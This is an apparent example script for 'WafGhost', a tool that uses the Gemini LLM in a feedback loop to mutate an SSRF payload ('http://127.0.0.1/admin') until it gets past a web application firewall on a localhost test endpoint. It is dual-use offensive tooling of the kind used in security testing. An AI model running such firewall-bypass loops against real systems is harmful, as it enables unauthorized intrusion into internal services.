"""
Example showing WafGhost integrated with the Gemini LLM provider.
"""

import os
import logging
import sys
from wafghost import WafBypasser

# Set up logging to stdout
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

def run_llm_example():
    # Make sure to set your API key in environment:
    # export GEMINI_API_KEY="your-api-key"
    if not os.getenv("GEMINI_API_KEY"):
        print("WARNING: GEMINI_API_KEY environment variable is not set.")
        print("Set it before running, or pass llm_api_key parameter directly.")

    target_url = "http://localhost:5000/ssrf-endpoint"
    base_payload = "http://127.0.0.1/admin"

    print("Initializing WafGhost with Gemini feedback loop...")
    bypasser = WafBypasser(
        target_url=target_url,
        base_payload=base_payload,
        vuln_type="ssrf",
        use_llm=True,
        llm_provider="gemini",
        max_llm_iterations=3
    )

    result = bypasser.run()

    print("\n" + "="*40)
    print("Result Summary:")
    print(f"Bypass Successful: {result.success}")
    if result.success:
        print(f"Successful Payload: {result.payload}")
    print(f"Total Attempts Made: {result.attempts}")
    print(f"Blocked characters detected: {result.block_map.get('blocked', [])}")
    print("="*40)

if __name__ == "__main__":
    run_llm_example()
